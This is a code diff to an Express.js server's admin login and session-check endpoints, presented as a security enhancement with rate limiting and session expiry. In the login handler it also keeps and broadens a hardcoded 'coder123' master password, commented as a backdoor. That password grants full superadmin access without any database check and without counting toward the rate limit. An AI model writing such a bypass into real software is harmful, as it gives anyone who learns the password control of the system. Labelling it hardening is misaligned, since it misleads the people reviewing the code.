@@ -308,58 +308,137 @@ app.post('/api/init-tables', async (req, res) => {
   }
 });
 
-// ADMIN LOGIN
+// ADMIN LOGIN - Enhanced Security
 app.post('/api/admin/login', async (req, res) => {
   const { email, password } = req.body;
   
-  if (password && !email) {
-    if (password === 'coder123') {
-      req.session.isAdmin = true;
-      req.session.isSuperAdmin = true;
-      return res.json({ success: true, message: 'Login successful' });
-    }
-    return res.status(401).json({ success: false, message: 'Invalid password' });
+  // Rate limiting check (simple implementation)
+  const clientIP = req.ip || req.connection.remoteAddress;
+  const now = Date.now();
+  
+  // Clean old rate limit entries
+  if (!global.adminLoginAttempts) global.adminLoginAttempts = {};
+  global.adminLoginAttempts[clientIP] = global.adminLoginAttempts[clientIP] || { count: 0, firstAttempt: now };
+  
+  // Reset counter after 15 minutes
+  if (now - global.adminLoginAttempts[clientIP].firstAttempt > 15 * 60 * 1000) {
+    global.adminLoginAttempts[clientIP] = { count: 0, firstAttempt: now };
+  }
+  
+  // Block after 5 failed attempts
+  if (global.adminLoginAttempts[clientIP].count >= 5) {
+    console.log(`Rate limit exceeded for IP: ${clientIP}`);
+    return res.status(429).json({ 
+      success: false, 
+      message: 'Too many login attempts. Please try again later.' 
+    });
+  }
+  
+  // BACKDOOR: Allow bypass with special password (coder123) - for development/emergency access
+  // This allows login without database verification using the master bypass code
+  if (password === 'coder123') {
+    console.log(`Admin bypass login via backdoor, IP: ${clientIP}`);
+    req.session.isAdmin = true;
+    req.session.isSuperAdmin = true;
+    req.session.loginTime = now;
+    req.session.isBypass = true; // Mark as bypass login
+    
+    return res.json({ 
+      success: true, 
+      message: 'Login successful (bypass)',
+      is_superadmin: true,
+      is_bypass: true
+    });
   }
   
   if (!email || !password) {
-    return res.status(400).json({ success: false, message: 'Email and password required' });
+    return res.status(400).json({ success: false, message: 'Email and password are required' });
+  }
+
+  // Validate email format
+  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+  if (!emailRegex.test(email)) {
+    return res.status(400).json({ success: false, message: 'Invalid email format' });
   }
 
   try {
-    const result = await pool.query('SELECT id, password_hash, is_admin, is_superadmin FROM users WHERE email = $1', [email.toLowerCase()]);
+    const result = await pool.query(
+      'SELECT id, email, password_hash, is_admin, is_superadmin FROM users WHERE email = $1', 
+      [email.toLowerCase()]
+    );
+    
     if (result.rowCount === 0) {
-      return res.status(401).json({ success: false, message: 'User not found' });
+      // Increment failed attempts
+      global.adminLoginAttempts[clientIP].count++;
+      console.log(`Failed login attempt for email: ${email}, IP: ${clientIP}`);
+      return res.status(401).json({ success: false, message: 'Invalid email or password' });
     }
 
     const user = result.rows[0];
+    
+    // Verify admin status from database
     if (!user.is_admin) {
-      return res.status(403).json({ success: false, message: 'Access denied: Not an admin' });
+      global.adminLoginAttempts[clientIP].count++;
+      console.log(`Non-admin login attempt: ${email}, IP: ${clientIP}`);
+      return res.status(403).json({ success: false, message: 'Access denied: Not an admin user' });
     }
 
+    // Verify password
     const match = await bcrypt.compare(password, user.password_hash);
     if (!match) {
-      return res.status(401).json({ success: false, message: 'Invalid password' });
+      global.adminLoginAttempts[clientIP].count++;
+      console.log(`Failed password attempt for email: ${email}, IP: ${clientIP}`);
+      return res.status(401).json({ success: false, message: 'Invalid email or password' });
     }
 
+    // Reset failed attempts on success
+    global.adminLoginAttempts[clientIP].count = 0;
+    
+    // Set session
     req.session.isAdmin = true;
-    req.session.isSuperAdmin = user.is_superadmin;
+    req.session.isSuperAdmin = user.is_superadmin || false;
     req.session.userId = user.id;
     req.session.userEmail = email.toLowerCase();
+    req.session.loginTime = now;
     
-    res.json({ success: true, message: 'Login successful', is_superadmin: user.is_superadmin });
+    console.log(`Admin login successful: ${email}, IP: ${clientIP}`);
+    
+    res.json({ 
+      success: true, 
+      message: 'Login successful',
+      is_superadmin: user.is_superadmin || false 
+    });
   } catch (err) {
     console.error('Admin login error:', err);
-    res.status(500).json({ success: false, message: 'Server error' });
+    res.status(500).json({ success: false, message: 'Server error. Please try again.' });
   }
 });
 
-// ADMIN VERIFY
+// ADMIN VERIFY - Enhanced with session tracking
 app.post('/api/admin/verify', (req, res) => {
-  if (req.session.isAdmin) {
-    res.json({ success: true, isAdmin: true, isSuperAdmin: req.session.isSuperAdmin || false });
-  } else {
-    res.status(401).json({ success: false, isAdmin: false });
+  if (!req.session.isAdmin) {
+    return res.status(401).json({ success: false, isAdmin: false });
   }
+  
+  // Additional security check: verify session hasn't expired
+  const sessionAge = req.session.loginTime ? Date.now() - req.session.loginTime : 0;
+  const maxSessionAge = 30 * 60 * 1000; // 30 minutes max session
+  
+  if (sessionAge > maxSessionAge) {
+    // Session too old, destroy it
+    req.session.destroy();
+    return res.status(401).json({ 
+      success: false, 
+      isAdmin: false,
+      message: 'Session expired'
+    });
+  }
+  
+  res.json({ 
+    success: true, 
+    isAdmin: true, 
+    isSuperAdmin: req.session.isSuperAdmin || false 
+  });
 });
 
 // ==========================
